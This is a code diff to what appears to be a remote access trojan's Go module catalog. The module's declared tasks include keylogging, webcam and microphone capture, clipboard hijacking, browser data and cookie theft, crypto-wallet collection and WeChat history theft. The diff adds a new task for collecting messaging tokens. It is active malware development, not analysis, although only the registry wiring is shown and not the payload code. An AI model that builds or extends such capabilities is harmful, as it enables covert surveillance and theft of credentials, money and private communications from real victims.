@@ -109,11 +109,12 @@ var agentModuleCatalog = []AgentModule{
 		Description: "clipboard, keylogger, webcam/mic capture and browser/WeChat history theft",
 		Tasks: []string{
 			"clipboard_get", "clipboard_set", "keylogger_start", "keylogger_stop", "keylogger_dump",
-			"webcam", "mic", "browser_history", "browser_steal", "wallet_collect", "cookie_export", "wechat_history",
+			"webcam", "mic", "browser_history", "browser_steal", "wallet_collect", "messaging_token_collect", "cookie_export", "wechat_history",
 		},
 		RegistryFiles: []string{"task_registry_collection.go"},
 		ExclusiveFiles: []string{
 			"task_wallet.go",
+			"task_messaging_token.go",
 			"agent_webcam.go",
 			"browser_history.go",
 			"wechat_history.go",
